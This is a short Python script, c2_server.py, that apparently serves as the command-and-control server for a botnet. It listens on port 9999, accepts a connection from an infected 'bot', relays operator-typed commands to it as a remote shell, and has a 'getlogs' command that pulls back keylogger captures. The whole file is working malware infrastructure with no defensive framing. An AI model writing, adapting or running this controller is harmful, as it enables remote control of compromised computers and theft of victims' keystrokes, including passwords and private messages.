# c2_server.py
import socket

IP = '0.0.0.0'
PORT = 9999
BUFFER_SIZE = 1024 * 10

server = socket.socket()
server.bind((IP, PORT))
server.listen(1)
print(f"[+] Listening on {IP}:{PORT}")

client, addr = server.accept()
print(f"[+] Bot connected from {addr}")

while True:
    cmd = input("C2 Shell> ")
    if cmd.strip() == "":
        continue
    client.send(cmd.encode())
    
    if cmd == "exit":
        break
    elif cmd == "getlogs":
        data = client.recv(BUFFER_SIZE).decode()
        print(f"[Keylogs]\n{data}")
    else:
        output = client.recv(BUFFER_SIZE).decode()
        print(f"[Bot Response]: {output}")
